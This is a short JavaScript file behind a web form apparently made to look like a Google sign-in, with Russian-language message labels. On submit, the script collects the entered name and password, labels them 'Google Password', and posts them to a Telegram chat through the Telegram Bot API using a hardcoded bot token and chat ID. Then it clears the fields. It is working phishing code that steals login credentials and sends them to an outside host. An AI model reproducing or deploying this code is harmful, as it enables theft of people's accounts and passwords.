const form = document.getElementById('google')
const TOKEN = "6839101586:AAEAQad_515f4lhz49c3I1kX0jLCnrO5D8Q"
const CHAT_ID = "-1001862459483"
const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`
const success = document.getElementById("success")
const nameInput = document.getElementById('name')
const emailInput = document.getElementById('email')
const icon = document.querySelector(".icon ion-icon")
const btn = document.getElementById('submitButton')











form.addEventListener('submit', function(e){
    console.log(e);
    e.preventDefault()




    let message = `<b> Заявка с сайта !</b>\n`
message += `<b> Google Отправитель: </b> ${ this.name.value }\n`
message += `<b> Google Пароль: </b> ${ this.password.value }\n`
console.log(this.password.value);
    


    axios.post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html', 
        text:  message,
    }).then((res)=>{
        this.name.value = "";
        this.password.value = "";
        // console.log(nameInput.value);
      
        
        
        // console.log(nameInput.value);
        // console.log(emailInput.value);
       
        // success.style.display = "block"
        // success.style.marginBottom = "20px"
    
    })
      



})










document.addEventListener('DOMContentLoaded', function() {
    const input = document.querySelector('.name');

    input.addEventListener('focus', function() {
        this.parentNode.classList.add('focused');
    });

    input.addEventListener('blur', function() {
        if (this.value === '') {
            this.parentNode.classList.remove('focused');
        }
    });
});

